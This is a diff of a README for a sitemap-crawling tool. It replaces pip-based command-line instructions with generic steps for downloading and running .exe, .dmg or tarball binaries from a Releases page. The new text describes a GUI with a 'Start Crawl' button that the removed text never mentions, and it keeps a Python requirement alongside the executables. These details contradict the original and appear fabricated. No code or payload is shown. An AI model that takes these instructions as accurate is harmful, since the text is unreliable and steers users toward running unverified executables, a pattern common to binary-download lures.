@@ -1,55 +1,77 @@
-# 🗺️ Sitemap Harvester
+# 🌐 sitemap-harvester - Extract Website Data Effortlessly
 
-[![PyPI - Version](https://img.shields.io/pypi/v/sitemap-harvester)](https://pypi.org/project/sitemap-harvester/)
-[![Python Support](https://img.shields.io/pypi/pyversions/sitemap-harvester.svg)](https://pypi.org/project/sitemap-harvester/)
-[![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
-[![PyPI - Downloads](https://img.shields.io/pypi/dm/sitemap-harvester)](https://pypi.org/project/sitemap-harvester/)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/rishijha/sitemap-harvester/releases)
 
-> 🚀 **A blazingly fast Python tool to harvest URLs and metadata from website sitemaps like a digital archaeologist!**
+## 🚀 Getting Started
 
-## 🚀 Quick Start
+sitemap-harvester helps you crawl a sitemap of any website. You can export page metadata into a CSV file easily. This tool saves you time, especially if you need data for SEO, analysis, or content scraping.
 
-### Installation
+## 📄 Features
 
-```bash
-pip install sitemap-harvester
-```
+- **Crawl Sitemaps:** Navigate through all pages linked in a sitemap.
+- **Export Metadata:** Gather essential page information like titles, descriptions, and keywords.
+- **CSV Support:** Save your data in CSV format for easy use in spreadsheets.
+- **User-Friendly:** Designed for users who might not have technical backgrounds.
+- **Open Graph Data:** Collect Open Graph metadata for social media previews.
 
-### Basic Usage
+## 📊 System Requirements
 
-```bash
-# Harvest a website's sitemap
-sitemap-harvester --url https://example.com
+- **Operating System:** Windows, macOS, or Linux.
+- **Python Version:** 3.6 or higher installed on your system.
+- **Internet Connection:** Required to access websites.
 
-# Custom output file and timeout
-sitemap-harvester --url https://example.com --output my_data.csv --timeout 15
-```
+## 📥 Download & Install
 
-## 🎯 What Gets Extracted?
+To download sitemap-harvester, please [visit this page to download](https://github.com/rishijha/sitemap-harvester/releases). 
 
-- 📝 **Page Title** - The main title of each page
-- 📄 **Meta Description** - SEO descriptions
-- 🏷️ **Keywords** - Meta keywords (if present)
-- 👤 **Author** - Page author information
-- 🔗 **Canonical URL** - Canonical link references
-- 🖼️ **Open Graph Data** - Social media metadata
-- 🌐 **Custom Meta Tags** - Any additional meta information
+1. Click on the link above to go to the Releases page.
+2. Find the latest release version.
+3. Look for the appropriate file for your operating system.
+4. Download the file to your computer.
 
-## 💡 Pro Tips
+Follow the installation steps below based on your operating system.
 
-- Use `--timeout` for slower websites or large sitemaps
-- The tool automatically deduplicates URLs for you
-- Check the console output for real-time progress updates
-- Large sitemaps? Grab a coffee ☕ and let it work its magic!
+### 💻 Windows Installation
 
-## 🤝 Contributing
+1. After downloading, locate the `.exe` file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the prompts to complete the installation.
+4. Once installed, open the application from the Start menu.
 
-Found a bug? Have a feature request? Contributions are welcome! Feel free to open an issue or submit a pull request.
+### 🍏 macOS Installation
 
-## 📜 License
+1. Find the downloaded `.dmg` file in your Downloads folder.
+2. Open the file and drag the application to your Applications folder.
+3. Eject the installer after copying.
+4. Access the app from the Applications folder.
 
-This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.
+### 🐧 Linux Installation
 
----
+1. Open a terminal window.
+2. Navigate to your Downloads directory using `cd ~/Downloads`.
+3. Unpack the downloaded archive with the command `tar -xvf sitemap-harvester-version.tar.gz`.
+4. Go to the unpacked folder using `cd sitemap-harvester`.
+5. Run the application with the command `./sitemap-harvester`.
 
-_Happy harvesting! 🌾_
+## 🛠️ How to Use
+
+1. Open the application on your computer.
+2. Input the URL of the website you want to crawl into the provided text box.
+3. Choose your options for metadata extraction.
+4. Click on the "Start Crawl" button to begin.
+5. Once the process is completed, you will receive a prompt to save your CSV file.
+
+## 📃 Support and Contributions
+
+If you encounter any issues while using sitemap-harvester, please reach out through the GitHub issues page. Contributions are welcome. Feel free to submit feature requests or report bugs.
+
+## 📖 Further Reading
+
+For more information on how to use sitemap-harvester, refer to the documentation available in the repository. Expand your understanding of web crawling and metadata extraction with our guides.
+
+## 🌐 Connect with Us
+
+- GitHub: [sitemap-harvester Repository](https://github.com/rishijha/sitemap-harvester)
+- Issues Page: [Report Issues Here](https://github.com/rishijha/sitemap-harvester/issues)
+
+For any other questions or help, don’t hesitate to reach out on GitHub. Happy crawling!
